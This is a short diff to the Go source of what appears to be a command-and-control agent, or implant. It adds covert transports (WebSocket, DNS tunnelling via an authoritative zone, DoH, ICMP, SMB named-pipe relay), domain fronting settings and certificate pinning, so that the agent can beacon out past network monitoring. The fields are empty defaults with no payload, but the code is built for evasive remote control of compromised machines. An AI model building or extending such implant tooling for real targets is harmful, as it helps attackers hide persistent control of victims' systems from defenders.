@@ -57,14 +57,21 @@ var (
 	defaultFrontDomain = ""
 
 	// Alternative transport selection.
-	// defaultTransport: http (default) | doh | icmp | smb
+	// defaultTransport: http (default) | ws | dns | doh | icmp | smb
 	// When non-http, the agent bypasses the HTTP beacon loop and uses the
 	// selected covert channel instead.
 	defaultTransport   = "http"
+	defaultWSServerURL = ""          // ws(s):// override; derived from serverURL if empty
+	defaultDNSDomain   = ""          // authoritative zone for dns transport, e.g. c2.example.com
+	defaultDNSServer   = ""          // DNS server address host:port (default: serverURL host:5353)
 	defaultDOHDomain   = ""          // required for doh transport
 	defaultDOHProvider = "cloudflare" // cloudflare | google
 	defaultSMBRelay    = ""          // hostname/IP of SMB relay host
 	defaultSMBPipe     = "svcctl"   // named pipe on relay
+
+	// Certificate pinning — SHA-256 fingerprint (hex) of server TLS leaf cert.
+	// Empty = no pinning (default). Format: "aabbcc..." or "aa:bb:cc:..."
+	defaultCertPin = ""
 
 	// Debug mode — keeps console open on exit (Windows)
 	debugMode = "false"
@@ -133,7 +140,11 @@ func main() {
 		ExecMethod:        defaultExecMethod,
 		Profile:           profiles.Get(defaultProfile),
 		FrontDomain:       defaultFrontDomain,
+		CertPin:           defaultCertPin,
 		Transport:         defaultTransport,
+		WSServerURL:       defaultWSServerURL,
+		DNSDomain:         defaultDNSDomain,
+		DNSServer:         defaultDNSServer,
 		DOHDomain:         defaultDOHDomain,
 		DOHProvider:       defaultDOHProvider,
 		SMBRelay:          defaultSMBRelay,
